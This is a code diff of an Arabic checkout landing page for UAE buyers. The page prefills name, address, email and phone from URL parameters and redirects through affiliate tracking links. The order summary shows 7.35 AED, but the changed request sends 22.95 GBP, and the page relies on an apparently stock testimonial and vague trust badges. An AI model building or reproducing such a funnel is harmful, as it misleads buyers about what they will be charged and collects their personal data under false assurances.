@@ -94,7 +94,7 @@ animation:loadingBar 2.2s ease-in-out infinite}
 sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
 </script>
 
-<div class="safe">دفع آمن عبر تشفير SSL</div>
+<div class="safe">دفع آمن مع تشفير SSL</div>
 
 <div class="wrap">
 
@@ -113,11 +113,11 @@ sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
 <img id="heroImg">
 <div>
 <div id="heroTitle" style="font-weight:900;font-size:14px"></div>
-<div class="sub">المنتج من الرابط الخاص بك</div>
+<div class="sub">منتج من الرابط الخاص بك</div>
 </div>
 </div>
 
-<div class="h2">1. المعلومات الشخصية</div>
+<div class="h2">1. معلومات التسجيل</div>
 
 <div class="form-grid">
 <input id="firstName" class="input" placeholder="الاسم الأول" required>
@@ -125,9 +125,9 @@ sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
 </div>
 
 <div class="form-grid">
-<input id="billingStreet" class="input" placeholder="العنوان" style="grid-column:1/-1" required>
+<input id="billingStreet" class="input" placeholder="العنوان (الشارع ورقم البناية)" style="grid-column:1/-1" required>
 <input id="billingPostcode" class="input" placeholder="الرمز البريدي" required>
-<input id="billingCity" class="input" placeholder="المدينة" required>
+<input id="billingCity" class="input" placeholder="المدينة / المنطقة" required>
 </div>
 
 <div class="form-grid">
@@ -137,49 +137,47 @@ sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
 
 <div class="form-grid">
 <select id="phonePrefix" class="select">
-<option value="+971"><bdi>+971</bdi> — الإمارات</option>
+<option value="+971">+971 — الإمارات العربية المتحدة</option>
 </select>
 <input id="phoneNumber" class="input" placeholder="رقم الهاتف" required>
 </div>
 
 <input id="nameInput" type="hidden">
-<button id="nextBtn" class="btn">المتابعة</button>
+<button id="nextBtn" class="btn">المتابعة إلى الدفع</button>
 
 </section>
-
-
 
 </div>
 
 <aside>
 
 <div class="widget">
-<div style="text-align:center;font-weight:800">آراء العملاء</div>
-<div style="text-align:center;font-weight:700;">فينيلة لارا</div>
+<div style="text-align:center;font-weight:800">تقييمات العملاء</div>
+<div style="text-align:center;font-weight:700;">فينيلا لارا</div>
 <div style="text-align:center;color:#f6b80c;">★★★★★</div>
-<p style="text-align:center">استلمت منتجي يوم أمس. تجربة رائعة جداً!</p>
+<p style="text-align:center">استلمت صلاحية الوصول الأمس! تجربة ممتازة للغاية!</p>
 </div>
 
 <div class="widget">
 <div class="delivery">
 <img id="sidebarImg" style="width:52px;height:52px;border-radius:8px;border:1px solid var(--line);display:none">
 <div>
-<div style="font-weight:800">توصيل سريع</div>
-<div class="sub">3–5 أيام عمل</div>
+<div style="font-weight:800">تسليم فوري</div>
+<div class="sub">وصول رقمي مباشر</div>
 </div>
-<div style="margin-right:auto;font-weight:800">مجاني</div>
+<div style="margin-right:auto;font-weight:800">مجاناً</div>
 </div>
 
 <div style="margin-top:14px;font-weight:800">ملخص الطلب</div>
-<div class="order-row"><span>المجموع</span><span>7.35 د.إ</span></div>
+<div class="order-row"><span>الإجمالي</span><span>7.35 AED</span></div>
 </div>
 
 <div class="widget">
 <div style="font-weight:800;margin-bottom:10px">لماذا تثق بنا</div>
 <div class="trust">
 <div class="box"><div>⭐</div><div>99% تقييمات إيجابية</div></div>
-<div class="box"><div>🔒</div><div>تشفير SSL آمن</div></div>
-<div class="box"><div>🛡️</div><div>تأمين بقيمة $250,000</div></div>
+<div class="box"><div>🔒</div><div>اتصال SSL آمن</div></div>
+<div class="box"><div>🛡️</div><div>ضمان محمي</div></div>
 </div>
 </div>
 
@@ -195,7 +193,6 @@ sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
 <p class="sub" style="margin-top:10px">يرجى الانتظار بضع ثوانٍ…</p>
 </div>
 </div>
-
 
 <script>
 const params = new URLSearchParams(window.location.search);
@@ -231,7 +228,6 @@ const phoneNumber = document.getElementById('phoneNumber');
 
 const overlay = document.getElementById("loading-overlay");
 
-// HERO (SAFE)
 if (qs.get('sub1') && heroTitle && hero) {
   heroTitle.textContent = d(qs.get('sub1'));
   hero.style.display = 'flex';
@@ -252,7 +248,6 @@ if (qs.get('sub2')) {
   }
 }
 
-// PREFILL
 if (qs.get('sub3')) firstName.value = d(qs.get('sub3'));
 if (qs.get('sub4')) lastName.value = d(qs.get('sub4'));
 if (qs.get('sub5')) billingStreet.value = d(qs.get('sub5'));
@@ -261,18 +256,17 @@ if (qs.get('sub7')) billingCity.value = d(qs.get('sub7'));
 if (qs.get('sub9')) emailInput.value = d(qs.get('sub9'));
 if (qs.get('sub10')) phoneNumber.value = d(qs.get('sub10')).replace(/[^\d]/g, '');
 
-// CONTINUE TO RANDOM PAYMENT URL
 nextBtn.onclick = async () => {
   nameInput.value = `${firstName.value} ${lastName.value}`.trim();
 
   if (!firstName.value || !lastName.value || !billingStreet.value || !billingPostcode.value || !billingCity.value || !emailInput.value || !phoneNumber.value) {
-    alert("يرجى إكمال جميع الحقول المطلوبة.");
+    alert("يرجى ملء جميع الحقول المطلوبة.");
     return;
   }
 
   try {
     nextBtn.disabled = true;
-    nextBtn.textContent = "جاري إنشاء رابط الدفع الآمن…";
+    nextBtn.textContent = "جاري إنشاء رابط دفع آمن…";
     overlay.setAttribute("aria-hidden", "false");
 
     const response = await fetch("/api/create-promo-checkout-link", {
@@ -281,10 +275,10 @@ nextBtn.onclick = async () => {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        plan: "lifetime",
-        step2File: "xo-uk2-ls.html",
-        currency: "AED",
-        amount: 7.35,
+        plan: "2295",
+        step2File: "xo-ae2-ls.html", 
+        currency: "GBP",
+        amount: 22.95,
         sourcePage: window.location.href,
 
         firstName: firstName.value.trim(),
@@ -301,8 +295,8 @@ nextBtn.onclick = async () => {
         country: "United Arab Emirates",
 
         ref: affiliateRef,
-originalQueryString: sessionStorage.getItem("orig_qs") || "",
-successUrl: "https://cudsr.bemobtrcks.com/go/40f5ab33-ff2e-46aa-88c8-8fab25a5f548"
+        originalQueryString: sessionStorage.getItem("orig_qs") || "",
+        successUrl: "https://cudsr.bemobtrcks.com/go/36e11429-e6d1-415e-8828-350f8c9a040f"
       })
     });
 
@@ -312,29 +306,34 @@ successUrl: "https://cudsr.bemobtrcks.com/go/40f5ab33-ff2e-46aa-88c8-8fab25a5f54
       throw new Error(data.error || "تعذر إنشاء رابط الدفع الآمن.");
     }
 
-    let nextUrl =
-  "https://www.legendspeak.net" +
-  data.url +
-  "?ref=" + encodeURIComponent(affiliateRef || "") +
-  "&sub1=" + encodeURIComponent(qs.get("sub1") || "") +
-  "&sub2=" + encodeURIComponent(qs.get("sub2") || "") +
-  "&pixel=" + encodeURIComponent(qs.get("pixel") || "") +
-  "&clickid=" + encodeURIComponent(qs.get("clickid") || "") +
-  "&affiliate_source=" + encodeURIComponent(qs.get("affiliate_source") || "");
+    let targetUrl;
+
+if (data.url.startsWith("http://") || data.url.startsWith("https://")) {
+    targetUrl = new URL(data.url);
+} else {
+    targetUrl = new URL(data.url, window.location.origin);
+}
+
+targetUrl.searchParams.set("ref", affiliateRef || "");
+targetUrl.searchParams.set("sub1", qs.get("sub1") || "");
+targetUrl.searchParams.set("sub2", qs.get("sub2") || "");
+targetUrl.searchParams.set("pixel", qs.get("pixel") || "");
+targetUrl.searchParams.set("clickid", qs.get("clickid") || "");
+targetUrl.searchParams.set("affiliate_source", qs.get("affiliate_source") || "");
 
 const subId = qs.get("sub_id");
 
 if (subId) {
-  nextUrl += "&sub_id=" + encodeURIComponent(subId);
+    targetUrl.searchParams.set("sub_id", subId);
 }
 
-window.location.href = nextUrl;
+window.location.href = targetUrl.toString();
 
   } catch (error) {
     overlay.setAttribute("aria-hidden", "true");
     nextBtn.disabled = false;
-    nextBtn.textContent = "المتابعة";
-    alert(error.message || "تعذر فتح صفحة الدفع الآمن. يرجى المحاولة مرة أخرى.");
+    nextBtn.textContent = "المتابعة إلى الدفع";
+    alert(error.message || "تعذر فتح نافذة الدفع الآمن. يرجى المحاولة مرة أخرى.");
   }
 };
 
